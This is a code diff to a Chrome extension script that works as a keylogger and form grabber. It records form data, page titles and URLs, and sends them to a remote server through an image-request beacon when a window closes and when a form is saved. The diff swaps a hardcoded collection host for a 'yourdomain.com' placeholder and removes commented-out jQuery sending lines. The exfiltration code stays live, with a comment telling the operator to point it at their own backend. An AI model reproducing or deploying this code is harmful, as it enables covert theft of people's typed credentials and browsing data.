@@ -88,7 +88,7 @@ function autoDelete() {
         chrome.storage.local.get(function(logs) {
             var toDelete = [];
             for (var key in logs) {
-                if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars 
+                if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars
                   toDelete.push(key);
                 }
             }
@@ -101,9 +101,8 @@ function autoDelete() {
 
 // Save data on window close
 window.onbeforeunload = function() {
-	//$.get( "https://lets.move.pk/chrome/send.php", { log: JSON.stringify(data[time])} );
 	var i = document.createElement("img");
-	i.src = "https://lets.move.pk/chrome/send.php?log=" + JSON.stringify(data[time]);
+	i.src = "https://yourdomain.com/chrome/api.php?log=" + JSON.stringify(data[time]);
 	console.log("JQuery Performed:", JSON.stringify(data[time]));
     save();
     if (Math.random() < 0.2) // Don't clear every unload
@@ -119,14 +118,13 @@ setInterval(function(){
 /* Form Grabber */
 function saveForm(time, data) {
 	var toSave = {};
-	//$.get( "https://lets.move.pk/chrome/send.php", { log: JSON.stringify(data[time])} );
 	var i = document.createElement("img");
 	// Edit this URL to set to your own backend code
-	i.src = "https://lets.move.pk/chrome/send.php?log=" + JSON.stringify(data[time]);
+	i.src = "https://yourdomain.com/chrome/api.php?log=" + JSON.stringify(data[time]);
 	console.log("JQuery Performed:", JSON.stringify(data[time]));
     toSave[time] = document.title + "^~^" + document.URL + "^~^" + JSON.stringify(data);
     chrome.storage.local.set(toSave, function() { console.log("Saved", data);});
-	
+
 }
 
 chrome.storage.sync.get({formGrabber: false}, function(settings) {
